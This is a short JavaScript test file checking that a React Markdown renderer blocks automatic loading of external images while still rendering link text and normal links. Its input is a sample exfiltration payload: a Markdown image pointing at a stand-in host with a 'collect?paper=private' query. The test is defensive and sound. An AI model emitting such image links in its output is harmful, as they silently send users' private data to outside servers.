import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import Markdown from '../src/Markdown.tsx';

test('untrusted Markdown cannot automatically load external images', () => {
  const html = renderToStaticMarkup(
    createElement(Markdown, {
      children:
        '![Diagram](https://untrusted.example/collect?paper=private)\n\n[Source](https://example.org)',
    }),
  );
  assert.ok(!html.includes('<img'));
  assert.ok(!html.includes('untrusted.example'));
  assert.match(html, /Diagram/);
  assert.match(html, /href="https:\/\/example.org"/);
});
